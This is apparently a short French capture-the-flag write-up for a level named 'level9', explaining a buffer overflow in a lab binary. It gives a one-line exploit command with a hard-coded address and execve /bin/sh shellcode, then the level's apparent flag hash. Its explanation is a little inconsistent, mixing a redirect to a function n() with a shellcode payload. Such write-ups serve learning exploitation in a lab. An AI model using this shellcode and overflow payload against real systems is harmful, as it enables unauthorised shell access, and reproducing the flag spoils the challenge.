# Analyse du code

Dans le code nous voyons qu'il n'y a pas de controle dans les inputs utilisateur. il y a une fonction  n(), qui execute un bash.
On va exploiter ce buffer overflow en redirigant EIP vers n()

# Preparation du payload

on veut que memcpy renvoie a l'adresse ou on a save notre shellcode d'ou l'adresse au debut de la chaine

./level9 $(python -c "print('\x0c\xa0\x04\x08' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + 'A'*(108 - 4 - 21) + '\x0c\xa0\x04\x08')")
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728